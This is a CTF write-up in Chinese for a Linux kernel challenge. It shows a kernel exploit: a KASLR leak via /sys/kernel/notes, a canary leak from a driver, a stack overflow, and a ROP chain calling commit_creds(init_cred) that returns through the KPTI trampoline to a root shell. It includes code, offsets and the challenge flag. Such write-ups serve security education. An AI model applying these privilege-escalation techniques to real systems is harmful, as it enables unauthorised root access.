# L3akCTF 2024 Xen Writeup

## 题目简述

题目启动一个启用 KASLR、SMEP、SMAP 与 KPTI 的 Linux 内核，并加载字符设备 `/dev/pip-pip`。从 initramfs 中提取并分析 `hello.ko` 可见：

- `read` 只接受用户地址 `0x1337000` 和长度 8，直接把当前内核栈 canary 复制给用户；
- `write` 在内核栈上只有 0x100 字节缓冲区，却允许 `copy_from_user` 最多复制 0x200 字节；
- 缓冲区后有 16 字节 email 字段和 canary，email 必须保持为 `pip@fakemail.com`，否则 `check` 会继续破坏后续栈内容。

漏洞利用需要先从 `/sys/kernel/notes` 恢复内核基址，再泄露 canary、构造内核 ROP，将当前进程凭据替换为 `init_cred`，最后经 KPTI trampoline 安全返回用户态。

## 解题过程

### 1. 从 Xen note 打破 KASLR

即使 `/proc/sys/kernel/kptr_restrict=1`，本题内核的 `/sys/kernel/notes` 仍包含 Xen 启动符号 `startup_xen` 的运行时地址。官方脚本在给定 bzImage 的 notes 布局中跳过 `0xcc` 字节，再读取 8 字节：

```c
read(fd, garbage, 0xcc);
read(fd, &startup_xen, 8);
kbase = startup_xen - 0x2268af0;
```

固定偏移 `0xcc` 和符号差值都属于题目内核。更稳健的通用实现应按 ELF note 的 `namesz`、`descsz`、`type` 逐项解析，并识别 Xen note，而不是假设其排列永远不变。

### 2. 按设备要求映射用户缓冲区并泄露 canary

驱动硬编码检查用户指针是否等于 `0x1337000`，因此官方脚本先把该地址作为 `mmap` 的地址提示：

```c
char *buffer = mmap(
    (void *)0x1337000,
    0x1000,
    PROT_READ | PROT_WRITE,
    MAP_PRIVATE | MAP_ANONYMOUS,
    -1,
    0
);
```

这里没有使用 `MAP_FIXED`；在题目的干净进程地址空间中，该提示地址能够原样返回。实际利用应再检查 `buffer == (void *)0x1337000`，否则即使映射成功，驱动也会拒绝后续 `read`。

调用：

```c
read(fd, buffer, 8);
```

驱动的 `pip_read` 会把自身栈上的 canary 复制到该地址，从而得到本次内核线程使用的 canary。

### 3. 还原写函数的栈布局

`pip_write` 的关键布局是：

```text
offset 0x000: body[0x100]
offset 0x100: email[0x10]
offset 0x110: canary
offset 0x118: return address
```

驱动先把 email 初始化为固定值，然后把最多 0x200 字节用户数据复制到 `body`。因此 payload 必须保留 email 与 canary：

```c
memset(buffer, 'a', 0x100);
memcpy(buffer + 0x100, "pip@fakemail.com", 0x10);
*(uint64_t *)(buffer + 0x110) = canary;
```

### 4. 内核 ROP 提权并返回用户态

根据计算出的内核基址，官方解法使用：

```text
init_cred       = kbase + 0x1a575a0
commit_creds    = kbase + 0x0d5870
pop rdi ; ret   = kbase + 0xe0c36d
KPTI trampoline = kbase + 0x10017bd
```

先保存用户态的 CS、SS、RSP 和 RFLAGS，然后在 return address 处布置：

```text
pop rdi ; ret
init_cred
commit_creds
swapgs_restore_regs_and_return_to_usermode + offset
0
0
win
user_cs
user_rflags
user_rsp
user_ss
```

`commit_creds(init_cred)` 把当前进程切换为 root 凭据。由于 SMEP/KPTI 开启，不能在内核态直接返回用户函数；trampoline 先恢复 GS 和页表，再由 `iretq` 返回用户态 `win()`。此时 `win()` 执行 `/bin/sh`，取得 root shell。

initramfs 中的真实 flag 为：

```text
L3AK{1s_K4SlR_3v3n_R43L?!!!}
```

## 方法总结

- KASLR 泄露面不只在日志与 procfs；内核 notes、崩溃元数据和平台启动 note 也可能携带绝对地址。
- 驱动把 canary 主动复制给用户，使 stack protector 失去意义。构造溢出时还必须保持中间 email 字段，否则检查函数会覆盖 ROP。
- 启用 SMEP、SMAP、KPTI 后，标准路径是内核 ROP 完成提权，再通过 KPTI trampoline 返回用户态；直接 ret2usr 会被 SMEP 阻止。
